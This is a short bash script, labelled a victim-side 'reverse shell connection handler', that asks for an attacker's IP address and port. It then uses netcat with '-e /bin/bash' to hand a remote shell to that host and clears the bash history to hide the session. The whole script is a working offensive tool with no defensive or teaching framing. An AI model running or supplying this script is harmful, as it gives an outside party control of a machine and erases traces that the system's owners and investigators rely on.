#!/bin/bash
# ------------------------------------------------------------------
#  Automated Reverse Shell Handler - Victim Script
# ------------------------------------------------------------------

echo "================================================="
echo "  Reverse Shell Connection Handler (Victim)     "
echo "================================================="

# Prompt for remote host connection details
echo -n "[*] Enter Attacker IP Address: "
read ip

echo -n "[*] Enter Target Port: "
read port

echo "[*] Initiating connection to $ip:$port..."

# Execute reverse shell via netcat
nc "$ip" "$port" -e /bin/bash 2>/dev/null

# Anti-forensics: Clear the current session's bash history
history -c
echo "[+] Session closed. History cleared."
